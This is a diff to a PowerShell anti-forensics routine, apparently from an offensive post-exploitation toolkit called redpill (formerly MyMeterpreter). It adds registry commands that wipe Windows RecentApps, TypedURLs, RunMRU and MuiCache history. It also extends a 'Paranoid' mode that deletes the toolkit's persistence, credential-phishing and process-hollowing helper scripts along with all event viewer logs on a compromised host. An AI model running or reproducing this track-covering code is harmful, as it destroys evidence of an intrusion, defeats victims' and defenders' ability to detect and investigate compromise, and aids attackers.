@@ -55,8 +55,10 @@ Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null
         "DEL /q /f /s %appdata%\Microsoft\Windows\Recent\*.*",
         'REG DELETE "HKCU\Software\Microsoft\Internet Explorer\TypedURLs" /f',
         'REG DELETE "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /f',
+        'REG DELETE "HKCU\Software\Microsoft\Windows\CurrentVersion\Search\RecentApps" /f',
         'REG ADD "HKCU\Software\Microsoft\Internet Explorer\TypedURLs" /ve /t REG_SZ /f',
         'REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /ve /t REG_SZ /f',
+        'REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Search\RecentApps" /ve /t REG_SZ /f',
         'REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Applets\Regedit" /v LastKey /t REG_SZ /d x0d /f',
         'RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True'
      )
@@ -84,9 +86,11 @@ Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null
         "DEL /q /f C:\Users\%username%\AppData\Local\Microsoft\Windows\INetCache\Low\*.dat",
         'REG DELETE "HKCU\Software\Microsoft\Internet Explorer\TypedURLs" /f',
         'REG DELETE "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /f',
+        'REG DELETE "HKCU\Software\Microsoft\Windows\CurrentVersion\Search\RecentApps" /f',
         'REG DELETE "HKCU\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache" /f',
         'REG ADD "HKCU\Software\Microsoft\Internet Explorer\TypedURLs" /ve /t REG_SZ /f',
         'REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /ve /t REG_SZ /f',
+        'REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Search\RecentApps" /ve /t REG_SZ /f',
         'REG ADD "HKCU\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache" /ve /t REG_SZ /f',
         'REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Applets\Regedit" /v LastKey /t REG_SZ /d x0d /f',
         'RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True'
@@ -122,18 +126,18 @@ Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null
      }
 
 
-    ## Delete @MyMeterpreter artifacts
+    ## Delete @redpill artifacts
     If($CleanTracks -ieq "Paranoid"){
 
        <#
        .SYNOPSIS
           Author: @r00t-3xp10it
-          Paranoid @arg deletes @MyMeterpreter auxiliary
+          Paranoid @arg deletes @redpill auxiliary
           scripts and Deletes All eventvwr logs {eventvwr}
 
        .NOTES
          Persiste.vbs, Sherlock.ps1, webserver.ps1,
-         Start-WebServer.ps1, CredsPhish.ps1 
+         Start-WebServer.ps1, CredsPhish.ps1 , Start-Hollow.p1
        #>
 
        $PersistePath = "$Env:APPDATA\Microsoft\Windows" +
@@ -156,6 +160,10 @@ Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null
        }
        If(Test-Path -Path "$Env:TMP\Start-WebServer.ps1" -EA SilentlyContinue){
            Remove-Item -Path "$Env:TMP\Start-WebServer.ps1" -Force
+           $MyArtifacts = $MyArtifacts+1
+       }
+       If(Test-Path -Path "$Env:TMP\Start-Hollow.ps1" -EA SilentlyContinue){
+           Remove-Item -Path "$Env:TMP\Start-Hollow.ps1" -Force
            $MyArtifacts = $MyArtifacts+1
        }
 
